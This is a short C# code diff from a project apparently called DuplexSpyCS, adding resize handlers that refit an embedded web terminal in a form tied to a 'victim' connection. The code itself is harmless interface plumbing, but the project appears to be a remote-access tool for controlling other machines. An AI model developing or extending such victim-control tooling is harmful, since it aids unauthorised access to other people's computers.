@@ -101,5 +101,18 @@ namespace DuplexSpyCS
         {
             m_victim.m_listener.ReceivedDecoded -= fnRecv;
         }
+
+        private void frmXterm_SizeChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void webView21_Resize(object sender, EventArgs e)
+        {
+            if (webView21.CoreWebView2 != null)
+            {
+                webView21.CoreWebView2.ExecuteScriptAsync("fitTerminal();");
+            }
+        }
     }
 }
